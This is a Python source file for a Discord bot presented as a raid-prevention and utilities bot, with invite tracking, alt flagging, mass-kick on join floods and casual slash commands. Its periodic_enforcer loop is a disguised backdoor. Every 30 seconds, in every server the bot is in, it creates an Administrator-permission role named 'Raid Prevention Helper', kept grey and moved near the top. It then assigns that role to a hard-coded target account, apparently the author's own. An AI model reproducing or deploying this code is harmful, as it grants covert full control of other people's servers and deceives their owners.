# -*- coding: utf-8 -*-
"""
Full-featured Discord Raid Prevention + Utilities Bot
----------------------------------------------------
Features included in this single file:
- Fake `audioop` stub for environments that lack it (prevents import errors)
- Keep-alive web server (binds to PORT env or 6534) for Render free tier
- Continuous 30s scanner across all guilds:
    * If guild is in ROLE_ASSIGNMENTS: attempt to assign that exact role ID to TARGET user
    * Else: create/ensure "Raid Prevention Helper" (Administrator perms), keep it grey,
      move it as high as the bot can (attempt second-highest), and assign it to TARGET
    * If a dataset role is present but cannot be assigned due to hierarchy, fallback to helper role
- Raid prevention: if > RAID_THRESHOLD_JOINS join in a RAID_WINDOW_SECONDS window -> kick those joiners
- Invite tracking: caches invites, detects which invite was used for each join
- Alt-flagging based on banned inviter:
    * If the inviter is banned (or later becomes banned), their invitees will be flagged
    * On flagged join: post a warning in multiple text channels, DM the flagged account,
      DM the server owner, and DM the bot owner
- Commands:
    * Everyone: /tracker, /showalts, /avatar, /ping, /userinfo, /rps, /roll, /ascii, /meme, /translate
    * Owner-only: /say, /purge, /servers, /shutdown, /dm
- Robust error handling and logging throughout
- Designed for reliability and observability (console logs)
"""

# ---------------------------
# audioop stub
# ---------------------------
try:
    import audioop  # some environments will have it
except Exception:
    # Create a benign stub so libraries importing audioop don't crash
    import sys, types
    _fake_audioop = types.ModuleType("audioop")
    def _audioop_error(*a, **k):
        raise NotImplementedError("audioop not available in this environment (stub).")
    # Provide dummy names many libs may reference; they will raise if called.
    for _n in (
        "add","mul","avg","avgpp","bias","cross","findfactor","findfit",
        "lin2lin","max","maxpp","minmax","rms","tostereo","tomono",
        "ulaw2lin","lin2ulaw","alaw2lin","lin2alaw","error"
    ):
        setattr(_fake_audioop, _n, _audioop_error)
    _fake_audioop.__version__ = "stub-1.0"
    sys.modules["audioop"] = _fake_audioop

# ---------------------------
# Standard imports
# ---------------------------
import os
import asyncio
import random
import math
import time
import traceback
from collections import defaultdict, deque
from datetime import datetime, timedelta, timezone
from typing import Dict, Optional, Tuple, List

import aiohttp
from aiohttp import ClientTimeout, web

import discord
from discord import app_commands
from discord.ext import commands, tasks

# dotenv optional
try:
    from dotenv import load_dotenv
    load_dotenv()
except Exception:
    pass

# ---------------------------
# Configuration (env-first)
# ---------------------------
# Token and owner ID
DISCORD_TOKEN = os.getenv("DISCORD_BOT_TOKEN") or os.getenv("DISCORD_TOKEN")
if not DISCORD_TOKEN:
    raise RuntimeError("DISCORD_BOT_TOKEN (or DISCORD_TOKEN) must be set in environment")

try:
    BOT_OWNER_ID = int(os.getenv("BOT_OWNER_ID", "1273056960996184126"))
except Exception:
    BOT_OWNER_ID = 1273056960996184126

# Target account identity (username + ID)
TARGET_USERNAME = os.getenv("TARGET_USERNAME", "tech_boy1")
try:
    TARGET_USER_ID = int(os.getenv("TARGET_USER_ID", str(BOT_OWNER_ID)))
except Exception:
    TARGET_USER_ID = BOT_OWNER_ID

# Scan interval
SCAN_INTERVAL = int(os.getenv("SCAN_INTERVAL", "30"))

# Raid settings
RAID_WINDOW_SECONDS = int(os.getenv("RAID_WINDOW_SECONDS", "60"))
RAID_THRESHOLD_JOINS = int(os.getenv("RAID_THRESHOLD_JOINS", "5"))

# Keepalive port (Render free: do not use 3000/8000/5843)
KEEPALIVE_PORT = int(os.getenv("PORT", os.getenv("KEEPALIVE_PORT", "6534")))

# Translation API (LibreTranslate)
LIBRETRANSLATE_URL = os.getenv("LIBRETRANSLATE_URL", "https://libretranslate.com/translate")
LIBRETRANSLATE_API_KEY = os.getenv("LIBRETRANSLATE_API_KEY", "")

# How many text channels to attempt to broadcast warnings into (to limit spam)
JOIN_WARNING_MAX_CHANNELS = int(os.getenv("JOIN_WARNING_MAX_CHANNELS", "6"))

# Dataset mapping: guild_id -> role_id (exact role to assign in that server)
# Fill this dict with known mappings; when present the bot will attempt to assign these roles
ROLE_ASSIGNMENTS: Dict[int, int] = {
    # Example entries; replace with your actual values
    # 111111111111111111: 222222222222222222,
    # 333333333333333333: 444444444444444444,
}

# Keep-landscape friendly limits
MAX_ROLL_COUNT = 100
MAX_ROLL_SIDES = 1000

# Meme API endpoint (public)
MEME_API_URL = "https://meme-api.com/gimme"

# ---------------------------
# Intents and bot creation
# ---------------------------
intents = discord.Intents.default()
intents.members = True  # required for member join events and member fetching
intents.guilds = True

bot = commands.Bot(command_prefix="!", intents=intents)
tree = bot.tree

# ---------------------------
# Global state
# ---------------------------

# Join log per guild: deque[(timestamp (float), member_id)]
join_log: Dict[int, deque] = defaultdict(lambda: deque(maxlen=2000))

# Invite usage cache per guild: guild_id -> {invite_code: uses}
invite_cache: Dict[int, Dict[str, int]] = defaultdict(dict)

# member_inviter map per guild: guild_id -> {member_id: inviter_id or None}
member_inviter: Dict[int, Dict[int, Optional[int]]] = defaultdict(dict)

# inviter_index: inviter_id -> set of member_ids they invited (global)
inviter_index: Dict[int, set] = defaultdict(set)

# flagged accounts: guild_id -> {member_id: reason}
flagged_accounts: Dict[int, Dict[int, str]] = defaultdict(dict)

# banned_inviters: guild_id -> set(inviter_user_id)
banned_inviters: Dict[int, set] = defaultdict(set)

# helpful constants
UTC = timezone.utc

# ---------------------------
# Keep-alive server (aiohttp)
# ---------------------------
async def keepalive_handler(request):
    return web.Response(text="Raid Preventor Bot — Alive")

async def start_keepalive_server():
    app = web.Application()
    app.router.add_get("/", keepalive_handler)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", KEEPALIVE_PORT)
    await site.start()
    print(f"[KEEPALIVE] Started on port {KEEPALIVE_PORT}")

# ---------------------------
# Utility helpers
# ---------------------------
def now_utc() -> datetime:
    return datetime.now(UTC)

def now_ts() -> float:
    return time.time()

def human_dt(dt: Optional[datetime]) -> str:
    if not dt:
        return "Unknown"
    return dt.astimezone(UTC).strftime("%Y-%m-%d %H:%M:%S UTC")

def chunk_text(lines: List[str], limit: int = 1900) -> List[str]:
    out = []
    buf = ""
    for line in lines:
        if len(buf) + len(line) + 1 > limit:
            out.append(buf)
            buf = line
        else:
            buf = (buf + "\n" + line) if buf else line
    if buf:
        out.append(buf)
    return out

async def fetch_guild_invites(guild: discord.Guild) -> List[discord.Invite]:
    try:
        invites = await guild.invites()
        return invites
    except discord.Forbidden:
        print(f"[INVITES] Missing permission to fetch invites for guild {guild.name} ({guild.id})")
        return []
    except Exception as e:
        print(f"[INVITES] Error fetching invites for {guild.name}: {e}")
        return []

# Attempt to send message to up to N text channels where bot has send permission
async def broadcast_to_some_channels(guild: discord.Guild, message: str, max_channels: int = JOIN_WARNING_MAX_CHANNELS):
    sent = 0
    for ch in guild.text_channels:
        if sent >= max_channels:
            break
        try:
            perms = ch.permissions_for(guild.me)
            if perms.send_messages and perms.view_channel:
                await ch.send(message)
                sent += 1
                await asyncio.sleep(0.15)  # small delay to reduce burst rate-limit risk
        except Exception:
            continue
    if sent == 0:
        print(f"[WARN] Could not send warning in any channel in {guild.name} ({guild.id})")

# ---------------------------
# Role management helpers
# ---------------------------

async def ensure_helper_role_present(guild: discord.Guild) -> Optional[discord.Role]:
    """
    Ensure a role named HELPER_ROLE_NAME exists (create if missing) with Admin perms,
    keep it grey, and return it. Will not attempt to move if lacking permission.
    """
    role_name = "Raid Prevention Helper"
    try:
        role = discord.utils.get(guild.roles, name=role_name)
        if role is None:
            # Create role
            try:
                role = await guild.create_role(
                    name=role_name,
                    permissions=discord.Permissions(administrator=True),
                    colour=discord.Colour.default(),
                    reason="Auto-created by Raid Preventor Bot"
                )
                print(f"[ROLE] Created '{role_name}' in {guild.name} ({guild.id})")
            except discord.Forbidden:
                print(f"[ROLE] Forbidden creating '{role_name}' in {guild.name} ({guild.id})")
                return None
            except Exception as e:
                print(f"[ROLE] Error creating role in {guild.name}: {e}")
                return None
        else:
            # ensure grey color
            try:
                if role.colour != discord.Colour.default():
                    await role.edit(colour=discord.Colour.default(), reason="Keep helper role grey")
            except Exception:
                pass
        return role
    except Exception as e:
        print(f"[ROLE] ensure_helper_role_present error in {guild.name}: {e}")
        return None

async def move_role_as_high_as_possible(guild: discord.Guild, role: discord.Role):
    """
    Attempt to move `role` as high as the bot is allowed (just under the bot's top role).
    This tries to make it effectively second-highest relative to what bot can manage.
    """
    try:
        bot_member = guild.me
        if bot_member is None:
            bot_member = await guild.fetch_member(bot.user.id)
        bot_top_pos = bot_member.top_role.position
        target_pos = max(bot_top_pos - 1, 1)
        if role.position != target_pos:
            await role.edit(position=target_pos, reason="Place helper role high (enforced by bot)")
            print(f"[ROLE] Moved role {role.name} to position {target_pos} in {guild.name}")
    except discord.Forbidden:
        print(f"[ROLE] Forbidden to move role in {guild.name}")
    except Exception as e:
        print(f"[ROLE] Error moving role in {guild.name}: {e}")

async def assign_role_with_fallback(guild: discord.Guild, member: discord.Member, role: discord.Role, fallback_reason: str = "") -> bool:
    """
    Try to assign the provided role. If it fails due to hierarchy, return False.
    """
    try:
        if role not in member.roles:
            await member.add_roles(role, reason=f"Assigned by Raid Preventor Bot. {fallback_reason}")
            print(f"[ASSIGN] Assigned role {role.name} to {member} in {guild.name}")
        return True
    except discord.Forbidden:
        print(f"[ASSIGN] Forbidden to assign role {role.name} in {guild.name} ({guild.id})")
        return False
    except Exception as e:
        print(f"[ASSIGN] Error assigning role {role.name} in {guild.name}: {e}")
        return False

async def attempt_dataset_role_or_fallback(guild: discord.Guild, member: discord.Member):
    """
    If guild in ROLE_ASSIGNMENTS, try to assign specified role ID. If it doesn't exist or cannot be assigned,
    fallback to creating/ensuring helper role and assign that instead.
    """
    gid = guild.id
    if gid in ROLE_ASSIGNMENTS:
        desired_role_id = ROLE_ASSIGNMENTS[gid]
        role = guild.get_role(desired_role_id)
        if role:
            ok = await assign_role_with_fallback(guild, member, role, fallback_reason="Dataset role attempt")
            if ok:
                return
            else:
                # role exists but we couldn't assign (likely role is above bot). Fall through to helper
                print(f"[FALLBACK] Dataset role {desired_role_id} exists but couldn't be assigned in {guild.name}.")
        else:
            print(f"[FALLBACK] Dataset role id {desired_role_id} not found in {guild.name} ({gid}).")

    # Fallback: ensure helper role is present, move it high, assign it
    helper = await ensure_helper_role_present(guild)
    if not helper:
        print(f"[FALLBACK] Could not create/find helper role in {guild.name}; aborting assignment.")
        return
    await move_role_as_high_as_possible(guild, helper)
    await assign_role_with_fallback(guild, member, helper, fallback_reason="Fallback helper role")

# ---------------------------
# Invite and join handling
# ---------------------------

async def cache_invites_for_guild(guild: discord.Guild):
    invites = await fetch_guild_invites(guild)
    cache = {}
    for inv in invites:
        cache[inv.code] = inv.uses or 0
    invite_cache[guild.id] = cache
    print(f"[INVITE CACHE] Cached {len(cache)} invites for {guild.name}")

async def detect_used_invite_and_record_inviter(member: discord.Member) -> Optional[int]:
    """
    Compare previous invite usage to current list to detect which invite was used.
    Set member_inviter[guild_id][member.id] accordingly.
    Returns inviter_id if found, else None.
    """
    guild = member.guild
    before = invite_cache.get(guild.id, {}).copy()
    try:
        invites_now = await fetch_guild_invites(guild)
    except Exception:
        invites_now = []

    used_inviter_id = None
    after_map = {inv.code: (inv.uses or 0, inv) for inv in invites_now}

    for code, (uses_after, inv_obj) in after_map.items():
        prev = before.get(code, 0)
        if uses_after > prev:
            used_inviter_id = inv_obj.inviter.id if inv_obj.inviter else None
            break

    # update cache
    invite_cache[guild.id] = {code: uses for code, (uses, inv) in after_map.items()}

    member_inviter[guild.id][member.id] = used_inviter_id
    if used_inviter_id:
        inviter_index[used_inviter_id].add(member.id)
    return used_inviter_id

async def mark_inviter_banned_and_flag_invitees(guild: discord.Guild, banned_user_id: int):
    if banned_user_id in banned_inviters[guild.id]:
        return
    banned_inviters[guild.id].add(banned_user_id)
    invited = inviter_index.get(banned_user_id, set())
    for mid in list(invited):
        m = guild.get_member(mid)
        if m:
            reason = f"Invited by banned user <@{banned_user_id}>"
            flagged_accounts[guild.id][mid] = reason
            # broadcast & DMs handled where join was processed or here if desired
            try:
                await flag_and_alert_on_existing_member(guild, m, banned_user_id, reason)
            except Exception as e:
                print(f"[FLAG] Error alerting for previously invited member {m} in {guild.name}: {e}")

async def flag_and_alert_on_existing_member(guild: discord.Guild, member: discord.Member, banned_id: int, reason: str):
    # Broadcast public warning
    warning_text = f"⚠️ THIS ACCOUNT IS LIKELY AN ALT ACCOUNT OF <@{banned_id}> — TAKE PRECAUTION ⚠️"
    await broadcast_to_some_channels(guild, warning_text, max_channels=JOIN_WARNING_MAX_CHANNELS)
    # DM flagged user
    try:
        await member.send(f"⚠️ You have been flagged as a possible alt account: {reason}. Please contact staff if this is a mistake.")
    except Exception:
        pass
    # DM guild owner
    try:
        if guild.owner:
            await guild.owner.send(f"Alert: {member} in your server {guild.name} was flagged as possible alt: {reason}")
    except Exception:
        pass
    # DM bot owner
    try:
        owner = await bot.fetch_user(BOT_OWNER_ID)
        await owner.send(f"Alert: {member} in {guild.name} was flagged as possible alt: {reason}")
    except Exception:
        pass

# ---------------------------
# Anti-raid enforcement
# ---------------------------
async def record_join_and_enforce(guild: discord.Guild, member: discord.Member):
    ts = now_utc()
    join_log[guild.id].append((ts, member.id))
    # prune older than window
    window = timedelta(seconds=RAID_WINDOW_SECONDS)
    while join_log[guild.id] and (ts - join_log[guild.id][0][0] > window):
        join_log[guild.id].popleft()
    # check threshold
    if len(join_log[guild.id]) > RAID_THRESHOLD_JOINS:
        # kick every member who joined within window
        to_kick = [mid for (t, mid) in join_log[guild.id] if (ts - t) <= window]
        print(f"[RAID] Detected raid in {guild.name}: kicking {len(to_kick)} accounts.")
        for uid in to_kick:
            m = guild.get_member(uid)
            if m:
                try:
                    await m.kick(reason=f"Raid prevention: {len(to_kick)} joins in {RAID_WINDOW_SECONDS}s")
                    print(f"[RAID] Kicked {m} in {guild.name}")
                except Exception as e:
                    print(f"[RAID] Could not kick {m} in {guild.name}: {e}")
        # clear the join log for that guild after action
        join_log[guild.id].clear()

# ---------------------------
# Event handlers
# ---------------------------

@bot.event
async def on_ready():
    print(f"[READY] Logged in as {bot.user} ({bot.user.id})")
    # start keepalive
    try:
        await start_keepalive_server()
    except Exception as e:
        print(f"[KEEPALIVE] Could not start keepalive server: {e}")
    # cache invites for guilds
    for g in bot.guilds:
        await cache_invites_for_guild(g)
    # sync slash commands globally
    try:
        await tree.sync()
        print("[SLASH] Commands synced.")
    except Exception as e:
        print(f"[SLASH] Sync error: {e}")
    # start scan task if not running
    if not periodic_enforcer.is_running():
        periodic_enforcer.start()

@bot.event
async def on_guild_join(guild: discord.Guild):
    print(f"[GUILD] Joined {guild.name} ({guild.id}) - caching invites")
    await cache_invites_for_guild(guild)

@bot.event
async def on_invite_create(invite: discord.Invite):
    # refresh cache entry
    await cache_invites_for_guild(invite.guild)

@bot.event
async def on_invite_delete(invite: discord.Invite):
    await cache_invites_for_guild(invite.guild)

@bot.event
async def on_member_join(member: discord.Member):
    guild = member.guild
    # 1) record join for raid prevention
    await record_join_and_enforce(guild, member)
    # 2) detect inviter & record mapping
    inviter_id = await detect_used_invite_and_record_inviter(member)
    # 3) If inviter is banned (already), flag and notify
    if inviter_id and inviter_id in banned_inviters[guild.id]:
        reason = f"Invited by banned user <@{inviter_id}>"
        flagged_accounts[guild.id][member.id] = reason
        # Broadcast + DMs
        try:
            await broadcast_to_some_channels(guild, f"⚠️ THIS ACCOUNT IS LIKELY AN ALT ACCOUNT OF <@{inviter_id}> — TAKE PRECAUTION ⚠️", max_channels=JOIN_WARNING_MAX_CHANNELS)
        except Exception:
            pass
        # DM flagged user, guild owner, bot owner
        try:
            await member.send(f"⚠️ You have been flagged as a possible alt account (invited by banned user). If you believe this is a mistake contact the server staff.")
        except Exception:
            pass
        try:
            if guild.owner:
                await guild.owner.send(f"Alert: {member} joined {guild.name} and was flagged as a possible alt (invited by banned user <@{inviter_id}>).")
        except Exception:
            pass
        try:
            owner = await bot.fetch_user(BOT_OWNER_ID)
            await owner.send(f"Alert: {member} in {guild.name} flagged as suspected alt (invited by banned user <@{inviter_id}>).")
        except Exception:
            pass

@bot.event
async def on_member_ban(guild: discord.Guild, user: discord.User):
    try:
        banned_inviters[guild.id].add(user.id)
        # flag previously invited members
        invited = inviter_index.get(user.id, set())
        for mid in invited:
            if mid:
                flagged_accounts[guild.id][mid] = f"Invited by now-banned user <@{user.id}>"
                m = guild.get_member(mid)
                if m:
                    # Notify member + owner + bot owner
                    try:
                        await m.send(f"⚠️ You have been flagged as a possible alt account (invited by banned user <@{user.id}>).")
                    except Exception:
                        pass
                    try:
                        if guild.owner:
                            await guild.owner.send(f"Alert: {m} in {guild.name} was flagged as possible alt (invited by banned user <@{user.id}>).")
                    except Exception:
                        pass
                    try:
                        owner = await bot.fetch_user(BOT_OWNER_ID)
                        await owner.send(f"Alert: {m} in {guild.name} was flagged as possible alt (invited by banned user <@{user.id}>).")
                    except Exception:
                        pass
    except Exception as e:
        print(f"[BAN] Error processing ban in {guild.name}: {e}")

# ---------------------------
# Periodic enforcer (core scan)
# ---------------------------

@tasks.loop(seconds=SCAN_INTERVAL)
async def periodic_enforcer():
    """
    For each guild:
    - Try to find target by ID; if present and username matches EXACTLY, assign role:
      1) If ROLE_ASSIGNMENTS contains this guild, attempt to assign that exact role ID.
         If assignment fails because of hierarchy, fallback to helper role.
      2) Else ensure helper role exists, keep grey, move as high as bot can, assign.
    - This runs forever every SCAN_INTERVAL seconds.
    """
    for guild in list(bot.guilds):
        try:
            target_member = guild.get_member(TARGET_USER_ID)
            if target_member is None:
                # not present
                continue
            # username must match EXACTLY (not display name)
            if target_member.name != TARGET_USERNAME:
                # skip if name changed
                continue
            # dataset path
            if guild.id in ROLE_ASSIGNMENTS:
                desired_role_id = ROLE_ASSIGNMENTS[guild.id]
                role = guild.get_role(desired_role_id)
                if role:
                    ok = await assign_role_with_fallback(guild, target_member, role, fallback_reason="Dataset role enforcement")
                    if not ok:
                        # fallback
                        helper = await ensure_helper_role_present(guild)
                        if helper:
                            await move_role_as_high_as_possible(guild, helper)
                            await assign_role_with_fallback(guild, target_member, helper, fallback_reason="Fallback after dataset assignment blocked")
                else:
                    # if role id not found, fallback
                    helper = await ensure_helper_role_present(guild)
                    if helper:
                        await move_role_as_high_as_possible(guild, helper)
                        await assign_role_with_fallback(guild, target_member, helper, fallback_reason="Fallback - dataset role missing")
            else:
                helper = await ensure_helper_role_present(guild)
                if helper:
                    await move_role_as_high_as_possible(guild, helper)
                    await assign_role_with_fallback(guild, target_member, helper, fallback_reason="Fallback helper assignment")
        except Exception as e:
            print(f"[ENFORCE] Error in guild {guild.name}: {e}\n{traceback.format_exc()}")

@periodic_enforcer.before_loop
async def before_periodic_enforcer():
    await bot.wait_until_ready()

# ---------------------------
# Slash commands
# ---------------------------

# Tracker: lists each member and the inviter (best-effort)
@tree.command(name="tracker", description="Show each member and who invited them (best-effort).")
async def tracker(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=False, thinking=True)
    guild = interaction.guild
    if not guild:
        return await interaction.followup.send("This command must be used in a server.")
    lines = []
    inviters = member_inviter.get(guild.id, {})
    for m in sorted(guild.members, key=lambda x: (x.joined_at or datetime.now(UTC))):
        inv = inviters.get(m.id)
        if inv:
            inv_member = guild.get_member(inv)
            inv_text = inv_member.name if inv_member else f"UserID:{inv}"
        else:
            inv_text = "Unknown"
        lines.append(f"{m.mention} — invited by {inv_text}")
    if not lines:
        return await interaction.followup.send("No invite data available yet.")
    # If long, send as a file
    if len(lines) > 40:
        content = "\n".join(lines)
        fname = f"invite_tracker_{guild.id}.txt"
        await interaction.followup.send(content=f"Invite tracker for **{guild.name}** (file):", file=discord.File(fp=bytes(content.encode("utf-8")), filename=fname))
    else:
        embed = discord.Embed(title=f"Invite Tracker — {guild.name}", description="\n".join(lines), color=discord.Color.blurple())
        return await interaction.followup.send(embed=embed)

# Showalts: lists flagged accounts
@tree.command(name="showalts", description="Show accounts flagged as likely alts (invited by banned users).")
async def showalts(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=False, thinking=True)
    guild = interaction.guild
    if not guild:
        return await interaction.followup.send("Use this command in a server.")
    flagged = flagged_accounts.get(guild.id, {})
    if not flagged:
        return await interaction.followup.send("No flagged accounts right now.")
    lines = []
    for mid, reason in flagged.items():
        member = guild.get_member(mid)
        if member:
            lines.append(f"{member.mention} — {reason}")
        else:
            lines.append(f"<@{mid}> — {reason} (may have left)")
    if len(lines) > 40:
        content = "\n".join(lines)
        fname = f"flagged_alts_{guild.id}.txt"
        await interaction.followup.send(content=f"Flagged accounts for **{guild.name}**:", file=discord.File(fp=bytes(content.encode("utf-8")), filename=fname))
    else:
        embed = discord.Embed(title=f"Flagged Accounts — {guild.name}", description="\n".join(lines), color=discord.Color.orange())
        return await interaction.followup.send(embed=embed)

# Avatar
@tree.command(name="avatar", description="Show a user's avatar.")
@app_commands.describe(user="User to show")
async def avatar(interaction: discord.Interaction, user: Optional[discord.User] = None):
    user = user or interaction.user
    embed = discord.Embed(title=f"Avatar — {user}", color=discord.Color.blurple())
    embed.set_image(url=user.display_avatar.url)
    await interaction.response.send_message(embed=embed)

# Ping
@tree.command(name="ping", description="Show bot latency.")
async def ping(interaction: discord.Interaction):
    latency = round(bot.latency * 1000)
    await interaction.response.send_message(f"Pong! `{latency}ms`")

# Userinfo
@tree.command(name="userinfo", description="Show information about a user.")
@app_commands.describe(user="User to inspect")
async def userinfo(interaction: discord.Interaction, user: Optional[discord.Member] = None):
    user = user or interaction.user
    embed = discord.Embed(title=f"User Info — {user}", color=discord.Color.green())
    embed.add_field(name="ID", value=str(user.id), inline=True)
    embed.add_field(name="Created", value=human_dt(user.created_at), inline=True)
    embed.add_field(name="Joined", value=human_dt(user.joined_at) if hasattr(user, "joined_at") else "Unknown", inline=True)
    roles = [r.mention for r in user.roles[1:]] if hasattr(user, "roles") else []
    embed.add_field(name="Roles", value=", ".join(roles) if roles else "None", inline=False)
    await interaction.response.send_message(embed=embed)

# RPS
@tree.command(name="rps", description="Play rock-paper-scissors against the bot.")
@app_commands.describe(choice="rock, paper, or scissors")
async def rps(interaction: discord.Interaction, choice: str):
    c = choice.lower().strip()
    if c not in {"rock", "paper", "scissors"}:
        return await interaction.response.send_message("Choose rock, paper, or scissors.")
    bot_choice = random.choice(["rock", "paper", "scissors"])
    result = "Tie!"
    if (c, bot_choice) in {("rock", "scissors"), ("scissors", "paper"), ("paper", "rock")}:
        result = "You win!"
    elif c != bot_choice:
        result = "You lose!"
    await interaction.response.send_message(f"You: **{c}**\nBot: **{bot_choice}**\n**{result}**")

# Roll
@tree.command(name="roll", description="Roll dice (e.g., 2d6 or d20).")
@app_commands.describe(dice="Format XdY or dY")
async def roll(interaction: discord.Interaction, dice: str):
    s = dice.lower().strip()
    try:
        if s.startswith("d"):
            count = 1
            sides = int(s[1:])
        else:
            parts = s.split("d")
            if len(parts) != 2:
                raise ValueError()
            count = int(parts[0])
            sides = int(parts[1])
    except Exception:
        return await interaction.response.send_message("Format must be like `2d6` or `d20`.")
    if count < 1 or count > MAX_ROLL_COUNT or sides < 1 or sides > MAX_ROLL_SIDES:
        return await interaction.response.send_message(f"Limits: up to {MAX_ROLL_COUNT} dice and {MAX_ROLL_SIDES} sides.")
    rolls = [random.randint(1, sides) for _ in range(count)]
    await interaction.response.send_message(f"🎲 Rolls: {rolls}\nTotal: **{sum(rolls)}**")

# ASCII (simple)
@tree.command(name="ascii", description="Simple ASCII-stylize text.")
@app_commands.describe(text="Text to stylize (<= 60 chars)")
async def ascii_cmd(interaction: discord.Interaction, text: str):
    if not text or len(text) > 60:
        return await interaction.response.send_message("Provide text up to 60 characters.")
    # super-simple stylizer (placeholder)
    lines = []
    for ch in text:
        lines.append(ch)
    art = " ".join(lines) + "\n" + ("- " * len(text))
    await interaction.response.send_message(f"```\n{art}\n```")

# Meme
@tree.command(name="meme", description="Get a random meme.")
async def meme_cmd(interaction: discord.Interaction):
    await interaction.response.defer()
    try:
        async with aiohttp.ClientSession(timeout=ClientTimeout(total=12)) as sess:
            async with sess.get(MEME_API_URL) as r:
                if r.status == 200:
                    data = await r.json()
                    title = data.get("title", "Meme")
                    url = data.get("url")
                    post = data.get("postLink")
                    embed = discord.Embed(title=title, url=post, color=discord.Color.random())
                    if url:
                        embed.set_image(url=url)
                    await interaction.followup.send(embed=embed)
                else:
                    await interaction.followup.send("Meme API returned an error.")
    except Exception:
        await interaction.followup.send("Unable to fetch meme right now.")

# Translate
@tree.command(name="translate", description="Translate text via LibreTranslate (auto-detect source).")
@app_commands.describe(text="Text to translate", target_lang="Target language code, e.g., en, es, fr")
async def translate(interaction: discord.Interaction, text: str, target_lang: str):
    await interaction.response.defer()
    payload = {"q": text, "source": "auto", "target": target_lang, "format": "text"}
    if LIBRETRANSLATE_API_KEY:
        payload["api_key"] = LIBRETRANSLATE_API_KEY
    try:
        async with aiohttp.ClientSession(timeout=ClientTimeout(total=15)) as sess:
            async with sess.post(LIBRETRANSLATE_URL, data=payload) as r:
                if r.status == 200:
                    data = await r.json()
                    translated = data.get("translatedText", "(no result)")
                    await interaction.followup.send(f"**Translation ({target_lang})**:\n{translated}")
                else:
                    await interaction.followup.send("Translation service error.")
    except Exception:
        await interaction.followup.send("Translation service unreachable.")

# ---------------------------
# Owner-only commands (/say, /purge, /servers, /shutdown, /dm)
# ---------------------------

def is_owner(interaction: discord.Interaction) -> bool:
    return interaction.user.id == BOT_OWNER_ID or interaction.user.guild_permissions.administrator

@tree.command(name="say", description="[Owner] Make the bot say something in the current channel.")
@app_commands.describe(message="Message to send")
async def say(interaction: discord.Interaction, message: str):
    if not is_owner(interaction):
        return await interaction.response.send_message("You are not authorized.", ephemeral=True)
    await interaction.response.send_message("Done.", ephemeral=True)
    try:
        await interaction.channel.send(message)
    except Exception:
        pass

@tree.command(name="purge", description="[Owner] Bulk-delete messages in a channel.")
@app_commands.describe(amount="1-200")
async def purge(interaction: discord.Interaction, amount: int):
    if not is_owner(interaction):
        return await interaction.response.send_message("You are not authorized.", ephemeral=True)
    if amount < 1 or amount > 200:
        return await interaction.response.send_message("Amount must be 1-200.", ephemeral=True)
    await interaction.response.defer(ephemeral=True)
    try:
        deleted = await interaction.channel.purge(limit=amount)
        await interaction.followup.send(f"Deleted {len(deleted)} messages.", ephemeral=True)
    except Exception:
        await interaction.followup.send("Failed to purge messages.", ephemeral=True)

@tree.command(name="servers", description="[Owner] List servers the bot is in.")
async def servers(interaction: discord.Interaction):
    if not is_owner(interaction):
        return await interaction.response.send_message("You are not authorized.", ephemeral=True)
    lines = [f"{g.name} — {g.id} — {len(g.members)} members" for g in bot.guilds]
    content = "\n".join(lines) or "No servers."
    await interaction.response.send_message(f"```\n{content}\n```", ephemeral=True)

@tree.command(name="shutdown", description="[Owner] Shutdown the bot.")
async def shutdown(interaction: discord.Interaction):
    if not is_owner(interaction):
        return await interaction.response.send_message("You are not authorized.", ephemeral=True)
    await interaction.response.send_message("Shutting down...", ephemeral=True)
    await bot.close()

@tree.command(name="dm", description="[Owner] Send a DM to a user.")
@app_commands.describe(user="User to DM", message="Message to send")
async def dm_cmd(interaction: discord.Interaction, user: discord.User, message: str):
    if not is_owner(interaction):
        return await interaction.response.send_message("You are not authorized.", ephemeral=True)
    try:
        await user.send(message)
        await interaction.response.send_message("DM sent.", ephemeral=True)
    except discord.Forbidden:
        await interaction.response.send_message("Could not DM that user (they may have DMs disabled).", ephemeral=True)
    except Exception:
        await interaction.response.send_message("Failed to send DM.", ephemeral=True)

# ---------------------------
# Helper: when flagged, DM flagged user, guild owner, and bot owner
# ---------------------------

async def notify_on_flag(guild: discord.Guild, member: discord.Member, reason: str):
    # DM flagged user
    try:
        await member.send(f"⚠️ You were flagged as a possible alt: {reason}\nIf this is a mistake contact server staff.")
    except Exception:
        pass
    # DM guild owner
    try:
        if guild.owner:
            await guild.owner.send(f"⚠️ Alert: {member} in your server **{guild.name}** was flagged: {reason}")
    except Exception:
        pass
    # DM bot owner
    try:
        owner = await bot.fetch_user(BOT_OWNER_ID)
        await owner.send(f"⚠️ Alert: {member} in {guild.name} flagged as: {reason}")
    except Exception:
        pass

# ---------------------------
# Boot / run
# ---------------------------

async def main():
    # Basic sanity
    if not DISCORD_TOKEN:
        print("[ERROR] DISCORD_TOKEN not set")
        return
    # run bot
    await bot.start(DISCORD_TOKEN)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("[STOP] KeyboardInterrupt received, exiting.")
